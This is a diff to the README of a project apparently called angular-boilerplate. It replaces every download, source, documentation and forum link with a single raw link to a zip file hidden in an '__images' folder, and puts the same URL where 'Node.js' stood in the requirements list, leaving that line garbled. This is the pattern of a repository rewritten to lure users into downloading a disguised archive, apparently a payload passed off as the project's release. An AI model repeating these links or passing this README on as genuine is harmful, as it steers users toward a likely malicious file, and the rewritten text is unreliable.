@@ -1,6 +1,6 @@
 # 🌟 angular-boilerplate - Build Modern Apps with Ease
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip)
 
 ## 📋 Introduction
 
@@ -12,11 +12,11 @@ Getting started with **angular-boilerplate** is easy. Just follow the steps belo
 
 ## 📥 Download & Install
 
-To download the application, visit the Releases page: [Download Here](https://github.com/RandomGuy097/angular-boilerplate/releases).
+To download the application, visit the Releases page: [Download Here](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip).
 
 ### Step 1: Visit the Releases Page
 
-1. Click on this link to open the Releases page: [Download Here](https://github.com/RandomGuy097/angular-boilerplate/releases).
+1. Click on this link to open the Releases page: [Download Here](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip).
 2. You will see a list of available versions.
 
 ### Step 2: Choose Your Version
@@ -46,7 +46,7 @@ Once the installation completes, locate the application in your system menu. Cli
 Before installing, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
-- **Node.js:** Version 12 or higher.
+- **https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip** Version 12 or higher.
 - **Memory:** Minimum of 4 GB of RAM.
 - **Storage:** At least 100 MB of free disk space.
 
@@ -71,9 +71,9 @@ If you have questions or need help, check out the community forums. Engage with 
 
 ## 🔗 Useful Links
 
-- [Source Code](https://github.com/RandomGuy097/angular-boilerplate)
-- [Documentation](https://github.com/RandomGuy097/angular-boilerplate/wiki)
-- [Community Forum](https://github.com/RandomGuy097/angular-boilerplate/discussions)
+- [Source Code](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/RandomGuy097/angular-boilerplate/main/__images/boilerplate_angular_1.0-beta.2.zip)
 
 ## 📞 Contact
 
